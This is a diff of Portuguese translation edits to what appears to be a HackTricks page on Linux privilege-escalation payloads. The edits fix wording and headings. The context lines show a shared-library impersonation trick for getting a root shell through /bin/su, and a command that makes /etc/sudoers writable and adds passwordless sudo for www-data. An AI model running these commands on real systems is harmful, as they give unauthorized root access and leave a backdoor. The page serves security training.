@@ -1,4 +1,4 @@
-# Payloads to execute
+# Payloads para executar
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -68,7 +68,7 @@ libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
 Neste caso, vamos tentar se passar por `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Então, verifique as funções desta biblioteca usadas pelo **`su`** binário:
+Então, verifique as funções desta biblioteca usadas pelo binário **`su`**:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -104,7 +104,7 @@ Agora, apenas chamando **`/bin/su`** você obterá um shell como root.
 
 Você pode fazer o root executar algo?
 
-### **www-data no sudoers**
+### **www-data para sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
